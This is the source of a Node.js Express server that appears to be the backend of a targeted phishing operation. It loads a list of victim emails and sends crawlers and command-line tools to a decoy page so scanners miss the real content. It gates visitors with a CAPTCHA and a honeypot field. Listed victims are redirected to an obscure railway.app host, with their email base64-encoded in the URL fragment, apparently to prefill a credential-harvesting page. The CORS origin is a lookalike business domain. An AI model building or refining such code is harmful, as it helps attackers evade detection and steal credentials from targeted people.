require('dotenv').config();
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const crypto = require('crypto');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');

const app = express();
const PORT = process.env.PORT || 3000;
const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');
const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://kranamedeyrunamnoputbod.up.railway.app';
const BACKEND_BASE = process.env.BACKEND_BASE || 'https://bckvirovironmentnmvironment.up.railway.app';
const DEBUG = process.env.DEBUG === 'true';

let validEmails = new Set();
let tokenMap = new Map();

// ✅ Serve static files like lalaland.html from root
app.use(express.static(path.join(__dirname)));

// ✅ Bot trap
app.use((req, res, next) => {
  const ua = req.headers['user-agent'] || '';
  const botIndicators = ['bot', 'crawler', 'spider', 'python', 'fetch', 'httpclient', 'wget', 'curl'];
  if (botIndicators.some(ind => ua.toLowerCase().includes(ind))) {
    return res.redirect('/xr91ee9e.html');
  }
  next();
});

// ✅ Middleware
app.use(helmet());
app.use(express.json());
app.use(cors({ origin: 'https://workteamshareseervices.info' }));

// ✅ Force HTTPS
app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] !== 'https') {
    return res.redirect(`https://${req.headers.host}${req.url}`);
  }
  next();
});

// ✅ Load valid emails
function loadEmails() {
  try {
    const data = fs.readFileSync(EMAIL_FILE, 'utf8');
    validEmails = new Set(data.split('\n').map(e => e.trim().toLowerCase()));
    console.log('[INFO] Email list loaded');
  } catch (err) {
    console.error('[ERROR] Failed to load emails:', err);
  }
}
loadEmails();
fs.watchFile(EMAIL_FILE, () => {
  console.log('[INFO] Detected change in email list — reloading');
  loadEmails();
});

// ✅ Clean expired tokens
setInterval(() => {
  const now = Date.now();
  for (const [token, info] of tokenMap.entries()) {
    if (info.expires < now) {
      tokenMap.delete(token);
      DEBUG && console.log(`[INFO] Expired token ${token} cleared`);
    }
  }
}, 5 * 60 * 1000); // 5 minutes

// ✅ Rate limiting (increased capacity + strategy)
app.use(rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 800, // increased to 800 requests per minute
  standardHeaders: true,
  legacyHeaders: false,
  message: { valid: false, message: 'Too many requests. Please wait a moment.' }
}));

// ✅ Email + CAPTCHA endpoint
app.post('/api/check-email', async (req, res) => {
  const { email, captchaToken, middleName } = req.body;

  if (middleName && middleName.trim() !== '') {
    return res.status(403).json({ valid: false, message: 'Bot activity detected' });
  }

  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).json({ valid: false, message: 'Enter a valid email address' });
  }

  if (!captchaToken) {
    return res.status(400).json({ valid: false, message: 'Captcha missing' });
  }

  try {
    const verify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `secret=${process.env.CLOUDFLARE_SECRET}&response=${captchaToken}`
    });
    const result = await verify.json();
    console.log('[CAPTCHA RESULT]', result);
    if (!result.success) {
      console.log('[CAPTCHA ERROR]', result['error-codes']);
      return res.status(400).json({ valid: false, message: 'Captcha failed. Reload page' });
    }
  } catch (err) {
    return res.status(500).json({ valid: false, message: 'Captcha verification error' });
  }

  const normalized = email.toLowerCase();
  if (!validEmails.has(normalized)) {
    return res.status(404).json({ valid: false, message: 'Email not recognized' });
  }

  const token = crypto.randomBytes(16).toString('hex');
  const encoded = Buffer.from(normalized).toString('base64');

  const existing = Array.from(tokenMap.entries()).find(([_, v]) => v.email === encoded);
  if (existing) {
    tokenMap.delete(existing[0]);
    DEBUG && console.log(`[INFO] Replacing previous token for ${normalized}`);
  }

  tokenMap.set(token, { email: encoded, expires: Date.now() + 5 * 60 * 1000 });
  const redirectUrl = `${BACKEND_BASE}/forward?token=${token}`;

  return res.json({ valid: true, redirectUrl });
});

// ✅ Final redirect handler
app.get('/forward', (req, res) => {
  const { token } = req.query;
  const entry = tokenMap.get(token);

  if (!entry || Date.now() > entry.expires) {
    tokenMap.delete(token);
    return res.status(403).send('Invalid or expired token.');
  }

  const finalUrl = `${REDIRECT_BASE}/#${entry.email}`;
  tokenMap.delete(token);
  res.redirect(finalUrl);
});

app.listen(PORT, () => {
  console.log(`[READY] Backend running on port ${PORT}`);
});
